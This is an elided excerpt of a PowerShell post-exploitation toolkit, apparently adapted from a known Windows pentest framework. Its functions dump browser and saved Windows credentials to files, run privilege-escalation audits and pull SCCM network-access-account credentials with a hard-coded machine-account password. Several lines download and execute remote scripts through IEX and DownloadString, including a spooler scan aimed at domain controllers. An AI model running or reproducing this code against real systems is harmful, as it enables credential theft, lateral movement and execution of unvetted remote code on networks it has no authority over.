...
function sharpcradle{
    ...
    if ($allthosedotnet)
    {
        ...
        if ($noninteractive)
        {
            ...
            if(!$consoleoutput){
                Invoke-Pointweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt
            }
            else
            {
                Invoke-Pointweb -command "all"
            }
            ...
            if (isadmin)
            {
                if(!$consoleoutput){Invoke-PointUp -command "audit" >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-PointUp -command "audit"}
            }
            else
            {
                if(!$consoleoutput){Invoke-PointUp -command " " >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-PointUp -command " "}
            }
...
function Inveigh {
    ...
    {
        Write-Host 'Starting WonTonPlatypus in a new window so that you can use this one for Invoke-TheHash'
        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''$S3cur3Th1sSh1t_repo/WonTonPlatypus/master/WonTonPlatypus.ps1'');WonTonPlatypus -repo $S3cur3Th1sSh1t_repo;}'
...
function Generalrecon{
  ...
  Function Get-FireWallRule
   ...
   Write-Host -ForegroundColor Yellow '-------> List running tasks'
     ...
     if(!$consoleoutput){cmdkey /list >> "$currentPath\Vulnerabilities\SavedCredentials.txt"}else{cmdkey /list} }
...
function SCCMXPN
{
    ...
    if(!$consoleoutput){$out = Invoke-SharpSCCM -command "get naa -u WonTonPlatypus$ -p Aut0mat3S0mePentestT4sks!"; $out; $out >> "$currentPath\Exploitation\SCCMXpnCreds.txt"}else{Invoke-SharpSCCM -command "get naa -u WonTonPlatypus$ -p Aut0mat3S0mePentestT4sks!"}
    Write-Host "Dont forget to cleanup and REMOVE the WonTonPlatypus$ Computer Account!!!!!!!!!"
}
...
function Spoolvulnscan
{
    ...
    {   
        IEX ($viewdevobfs)         
      Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service!'         iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/SpoolerScanner/master/SpoolerScan.ps1')
